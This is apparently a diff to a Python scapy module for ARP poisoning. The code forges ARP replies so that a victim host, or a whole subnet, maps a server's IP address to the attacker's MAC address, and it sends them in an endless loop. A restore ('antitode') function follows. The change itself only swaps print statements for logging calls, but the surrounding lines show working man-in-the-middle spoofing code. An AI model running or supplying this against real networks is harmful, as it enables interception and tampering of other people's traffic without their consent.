@@ -2,20 +2,21 @@
 #this module spoof a server address to a target victim --> the target could be also the entire subnet
 # import scapy if not already imported
 from scapy.all import *
-
+import logging
 # does scapy actually know in which interface it must send packet?
 TIMEOUT = 2
 
 # poison target spoofing server IP address with fake server mac
 def poison( target_ip, target_mac, server_ip, fake_server_mac ): # target and server should have an ip and a mac address
-	print ("[*] Begin ARP poisoning..")
+	logging.info ("[*] Begin ARP poisoning..")
 
 	arprq = ARP()
 	arprq.psrc = server_ip # from IP
 	arprq.pdst = target_ip # send to IP
 	arprq.hwsrc = fake_server_mac # MY MAC
 	arprq.op = 2 # arp rely THIS IP IS AT THIS MAC
-	print ( "Sending: ", arprq.summary() )
+
+	logging.info ( "Sending: {}".format( arprq.summary() ) )
 
 	while True:
 		send( arprq, verbose=0 )
@@ -24,7 +25,8 @@ def poison( target_ip, target_mac, server_ip, fake_server_mac ): # target and se
 
 # restore target ARP table sending true mac address from server IP
 def antitode( target_ip, target_mac, server_ip, real_server_mac ):
-	print ("[*] ARP antitode..")
+	logging.info ("[*] ARP antitode..")
+
 	arprq = ARP()
 	arprq.psrc = server_ip # from IP
 	arprq.pdst = target_ip # send to IP
